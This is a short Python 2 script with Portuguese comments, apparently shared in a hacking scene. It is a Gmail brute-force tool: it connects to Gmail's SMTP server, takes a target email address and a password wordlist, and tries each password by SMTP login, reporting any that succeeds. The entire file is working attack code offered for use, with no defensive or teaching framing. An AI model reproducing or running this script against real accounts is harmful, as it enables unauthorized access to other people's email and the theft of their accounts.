#!/usr/bin/python
#Criado por mutr0l
#coding: utf-8
#Versao 1.0
#Salves: WebDark, DebutySec

print """========[GMAIL BRUTEFORCE]========"""
print """        Criador: mutr0l"""
print """         Versao: 1.0"""
print """=================================="""

#Modulos
import time
import smtplib

#Conexao com gmail
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

#Inserir email e senha
user = raw_input("Digite o email: ")
passwfile = raw_input("Digite a wordlist: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	time.sleep(5)	
	
	
	
	try:
		smtpserver.login(user, password)

		print "[+] Senha certa: %s" % password
		break;
	except smtplib.SMTPAuthenticationError:
		print "[+] Senha Errada: %s" % password
